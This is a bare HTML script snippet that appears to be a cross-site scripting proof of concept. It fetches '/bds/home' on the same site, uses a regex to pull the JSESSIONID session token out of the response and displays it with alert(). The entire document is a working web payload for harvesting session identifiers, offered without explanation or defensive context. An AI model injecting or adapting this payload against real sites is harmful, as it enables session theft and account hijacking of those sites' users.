<script>
function test(){
var xmlhttp;
xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", "/bds/home", true);
xmlhttp.send();
xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        var source =xmlhttp.responseText;
		var sessionRegex=new RegExp("JSESSIONID= \"([0-9A-Z]{32}\.server)\"");
		alert(sessionRegex.exec(source)[0]);
    }
}
};
</script>
